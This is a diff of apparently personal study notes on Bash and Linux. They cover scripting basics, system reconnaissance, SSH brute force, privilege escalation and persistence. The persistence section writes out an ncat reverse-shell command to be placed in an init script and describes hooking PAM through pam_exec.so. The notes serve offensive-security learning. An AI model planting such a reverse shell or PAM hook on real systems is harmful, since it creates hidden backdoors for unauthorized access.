@@ -4,11 +4,9 @@
 ###############################################################################
 
 ################################# Bash Basics #################################
-
 # Debugging Bash files
 * bash -n script.sh
 * -n flag shows errors
-
 * bash -x script.sh
 * -x flag turns on verbose mode
 
@@ -19,7 +17,6 @@
       echo ${book}
 * unset variables using the unset cmd
   unset var
-
 * Expressions
   - result=$((4 * 4))           // Double paranthesis syntax
   - result=$(expr 5 + 505)      // expr command evaluates expr
@@ -39,7 +36,6 @@
 # Streams
 * Streams are files that act as communication channels between a program and 
   its environment
-
   Bash Data Streams
   Stream name     Description                             File Descriptor 
      stdin        Data coming into a program as input     0
@@ -120,7 +116,6 @@
   else 
     # Condition is not met
   fi
-
 * Linking conditions together such as
   [[ condition ]] && [[ condition ]]
 
@@ -133,7 +128,6 @@
   func(){
     # func body
   }
-
 * To call a function enter the name
 
 # Loops
@@ -328,6 +322,7 @@
 # Initial Access With Brute Force
 * ssh 
   - Allows both password-based and key-based authentication
+  - Use a bash script and sshpass to automate process
 * Brute Force
   - dictionary-based brute-force attack against an SSH Server 
   - list of usernames, list of passwords
@@ -370,6 +365,161 @@
   /etc/passwd fields seperated by colons
   Account  Password  User ID  Group ID  Comment  Home directory  Default shell
   root     x         0        0         root     /root           /bin/bash
+
+  /etc/group fields 
+  Group Name  Password  GID  list of members
+  root        x         0    
+
+# Home Folder Access
+* to list all home directories and their permissions
+  - $ ls -al /home
+* check whether each user has the default shell to /bin/bash or /bin/sh
+
+# Processes
+* Every process in Linux has a dedicated directory under /proc/ that is named 
+  after its process identifier (PID)
+  - $ ls /proc/ | grep -E '^[0-9]+$'
+  - process 1 is the init process should always be present
+  - new processes can frequently spawn and die 
+
+  /proc/<pid>/cmdline   full cmd used to start proc
+  /proc/<pid>/cwd       working dir of proc
+  /proc/<pid>/environ   environment vars at proc's start time
+  /proc/<pid>/exe       bin that started the proc
+  /proc/<pid>/task      subdirs for each thread started by proc
+  /proc/<pid>/status    proc state, virtual memory, number of threads, ...
+  /proc/<pid>/fd        file descriptors in use
+
+# Operating System
+* Can identify os by reading from certain files which give clues
+  - /etc/*-release /etc/*-version /usr/lib/os-release /proc/version /etc/issue
+  - uname cmd, lsb_release, hostname
+
+# Login Sessions and User Activity
+* View current users on a system
+  - $ w
+  - $ who
+* historical logins
+  - $ last
+  - $ lastb  - list of bad login attempts
+
+# Investigating Executed Commands
+* history files stores a users executed cmds
+* usually hidden files located at /<user>/.history or /home/<user>/.bash_history
+  - $ history
+
+# Software Installations
+* APT (Advanced Package Tool) 
+  - $ apt list --installed
+* dpkg
+  - $ dpkg -l
+* packages installed by source may not be listed in the package list
+
+# Storage
+* Identify which block devices exist
+  - block devices are data storage devices (CDs, floppy disks, hard disks)
+  - $ lsblk
+* Provide list of all mounts
+  - $ mount    $ cat /proc/mounts
+* view the various mounted filesystems - indicate the available and total disk
+  sizes of each filesystem
+  - df -h -T
+
+# Logs
+* Common system logs
+  /var/log/auth.log           /var/log/faillog
+  /var/log/secure             /var/log/lastlog
+  /var/log/audit/audit.log    /var/log/dpkg
+  /var/log/dmesg              /var/log/boot.log
+  /var/log/messages           /var/log/cron
+  /var/log/syslog
+
+# Scheduled Tasks
+* Scheduled tasks specify a cmd or script for the system to run automatically
+  at a specified interval.
+* Cron
+  - $ crontab -e    /etc/crontab file
+  - Cron syntax to describe its execution schedule
+  Minutes(0-59), Hours(0-23), Days of month(1-31), Month(1-12), Days of week(0-6)
+  - * stands for any
+  - Restrict who can create cronjobs
+    crontab cmd /etc/cron.allow /etc/cron.deny
+
+# Virtualization
+* Check whether a system is physical or virtual
+  - $ sudo virt-what
+  - $ systemd-detect-virt
+
+########################### Privilege Escalation ###############################
+* Priviledge escalation occurs when a low-priviledged user is able to perform
+  priviledged operations that are outside the scope of the current user's 
+  identity permissions by abusing misconfigs.
+
+# View Permissions
+* $ ls -l <file> 
+
+  type  user  group  other
+   -     rw-   r--    r--
+  - type of hyphen is a file and character d represents a directory
+* Setting Permissions
+  - chown <user>:<group> <file>
+* Creating groups
+  - $ sudo groupadd <groupname>
+  - $ sudo useradd <user> -G <groupname> 
+* getfactl to observe default ACLS (Access Control Lists)
+  - $ getfacl <file>
+* setfacl to modify permissions for groups and users
+  - $ setfacl -m g:<group>:<permissions> <file>
+  - $ setfacl -m u:<user>:<permissions> <file>
+  
+* Sticky Bit
+  - When set on a dir file under that dir cannot be deleted by users or groups
+    who don't own the files regardless of file permissions
+  - bit 't' $ chmod +t <dir>
+
+* Search for files and dirs
+  - $ find <dir> -type <f or d> -perm -o=rwx
+  - find files with SetGID $ find / -perm -4000 
+
+############################### Persistence ###################################
+
+# Modifying Service Configurations
+* Exploit System V and systemd, system mechanisms that manage services and
+  control the start sequence of processes
+* System V 
+  - System V's /etc/init.d directory contains shell scripts, called init 
+    scripts responsible for starting services (such as ssh, cron, ...)
+  - For example some scripts may start on boot so if custom bash logic was
+    placed in the script it will run. 
+    Add reverse shell connection into the script
+  - $ ncat 172.16.10.1 4444 -e /bin/bash 2> /dev/null &
+    ncat: cmd
+    172.16.10.1 4444: target ip addr at target port
+    -e /bin/bash: tell ncat to execute /bin/bash after establishing connection
+    2> /dev/null: redirects stderr to be disregarded
+    &: move process to background
+
+# Hooking into Pluggable Authenticaion Modules
+* Pluggable authentication modules (PAMs) provide high-level APIs for low-level
+  authentication schemes, and applications can use them to authenticate users.
+* PAM configuration files live in the /etc/pam.d directory
+  - ex: common-session includes session-related modules that are common to all
+    services
+* PAM can call external scripts at certain points during an authentication flow
+  by using the pam_exec.so library
+  - This could make PAM call our own script whenever a user logs in to a system
+  
+# Generating Rogue ssh keys
+
+
+
+
+
+
+
+
+
+
 
 
 
